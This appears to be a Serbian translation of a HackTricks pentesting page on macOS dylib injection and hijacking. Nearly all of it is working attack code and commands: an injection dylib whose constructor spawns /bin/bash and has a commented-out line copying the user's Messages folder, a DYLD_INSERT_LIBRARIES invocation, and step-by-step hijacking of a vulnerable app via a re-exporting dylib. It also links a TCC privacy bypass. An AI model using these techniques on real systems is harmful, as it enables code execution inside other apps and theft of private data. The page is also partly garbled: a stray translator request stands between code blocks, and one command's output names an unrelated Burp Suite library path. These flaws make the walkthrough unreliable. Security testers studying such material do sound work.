# macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES

{{#include ../../../../banners/hacktricks-training.md}}

## DYLD_INSERT_LIBRARIES Osnovni primer

**Library za injection** radi izvršavanja shell-a:
```c
// gcc -dynamiclib -o inject.dylib inject.c

#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
printf("[+] dylib injected in %s\n", argv[0]);
execv("/bin/bash", 0);
//system("cp -r ~/Library/Messages/ /tmp/Messages/");
}
```
Binary za napad:
```c
// gcc hello.c -o hello
#include <stdio.h>

int main()
{
printf("Hello, World!\n");
return 0;
}
```
Injekcija:
```bash
DYLD_INSERT_LIBRARIES=inject.dylib ./hello
```
## Primer Dyld Hijacking-a

Ciljani ranjivi binary je `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.

{{#tabs}}
{{#tab name="entitlements"}}

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>[...]com.apple.security.cs.disable-library-validation[...]
</strong></code></pre>

{{#endtab}}

{{#tab name="LC_RPATH"}}
```bash
# Check where are the @rpath locations
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2
cmd LC_RPATH
cmdsize 32
path @loader_path/. (offset 12)
--
cmd LC_RPATH
cmdsize 32
path @loader_path/../lib2 (offset 12)
```
{{#endtab}}

{{#tab name="@rpath"}}
```bash
# Check libraries loaded using @rpath and the versions used
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
name @rpath/lib.dylib (offset 24)
time stamp 2 Thu Jan  1 01:00:02 1970
current version 1.0.0
compatibility version 1.0.0
# Check the versions
```
{{#endtab}}
{{#endtabs}}

Na osnovu prethodnih informacija znamo da **ne proverava signature učitanih libraries** i da **pokušava da učita library iz**:

- `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
- `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`

Međutim, prvi ne postoji:
```bash
pwd
/Applications/VulnDyld.app

find ./ -name lib.dylib
./Contents/Resources/lib2/lib.dylib
```
Dakle, moguće je izvršiti hijacking! Kreirajte library koja **izvršava proizvoljan kod i izvozi iste funkcionalnosti** kao legitimna library tako što je reexportuje. I ne zaboravite da je kompajlirate sa očekivanim verzijama:
```objectivec:lib.m
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"[+] dylib hijacked in %s", argv[0]);
}
```
Pošaljite sadržaj koji treba prevesti.
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
# Note the versions and the reexport
```
Putanja za reexport kreirana u biblioteci relativna je u odnosu na loader; promenimo je u apsolutnu putanju do biblioteke koju treba reexportovati:
```bash
#Check relative
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 48
name @rpath/libjli.dylib (offset 24)

#Change the location of the library absolute to absolute path
install_name_tool -change @rpath/lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib

# Check again
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 128
name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
```
Na kraju je samo kopirajte na **kompromitovanu lokaciju**:
```bash
cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
```
I **izvršite** binarni fajl i proverite da li je **biblioteka učitana**:

<pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
</strong>Usage: [...]
</code></pre>

> [!TIP]
> Dobar tekst o tome kako zloupotrebiti ovu ranjivost za zloupotrebu dozvola za kameru u aplikaciji telegram možete pronaći na [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>

## Veći obim

Ako planirate da pokušate da ubacite biblioteke u neočekivane binarne fajlove, možete proveriti poruke događaja da biste utvrdili kada je biblioteka učitana unutar procesa (u ovom slučaju uklonite printf i izvršavanje `/bin/bash`).
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```
## References

- [1] [CVE-2023-26818 - Zaobilaženje TCC-a pomoću Telegrama u macOS-u](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
{{#include ../../../../banners/hacktricks-training.md}}
